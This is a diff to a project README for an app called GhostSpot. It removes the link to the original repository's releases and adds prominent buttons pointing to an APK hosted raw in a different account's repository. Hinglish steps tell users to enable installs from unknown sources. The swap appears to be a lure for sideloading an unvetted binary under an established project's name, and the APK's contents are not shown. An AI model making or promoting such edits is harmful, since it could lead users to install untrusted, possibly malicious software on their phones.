@@ -4,7 +4,20 @@
   <img src="docs/logo.svg" alt="GhostSpot Logo" width="160" height="160">
 </p>
 
-[![Latest release](https://img.shields.io/github/v/release/kota-zo/myspoti?label=release)](https://github.com/kota-zo/myspoti/releases/latest)
+<p align="center">
+  <a href="https://github.com/Rohit-0226/Ghost-Spot/raw/main/GhostSpot-v2.4.0.apk">
+    <img src="https://img.shields.io/badge/DOWNLOAD_GHOSTSPOT_APK-v2.4.0-1ED760?style=for-the-badge&amp;logo=android&amp;logoColor=white" height="52">
+  </a>
+</p>
+
+### 📲 [👉 Direct Download: GhostSpot-v2.4.0.apk](https://github.com/Rohit-0226/Ghost-Spot/raw/main/GhostSpot-v2.4.0.apk)
+
+> ### 📱 Mobile Installation Guide (Pehle Yahan Se Install Karo):
+> 1. Upar diye gaye **[Download GhostSpot APK](https://github.com/Rohit-0226/Ghost-Spot/raw/main/GhostSpot-v2.4.0.apk)** link par tap karo.
+> 2. Download complete hone ke baad `GhostSpot-v2.4.0.apk` par tap karo.
+> 3. Browser setting me **"Allow from this source"** enable karo aur **Install** tap karo!
+
+---
 [![License: GPL-3.0](https://img.shields.io/github/license/kota-zo/myspoti)](LICENSE)
 [![Discord](https://img.shields.io/badge/Discord-join-5865F2?logo=discord&logoColor=white)](https://discord.gg/jXKnGVFnGS)
 
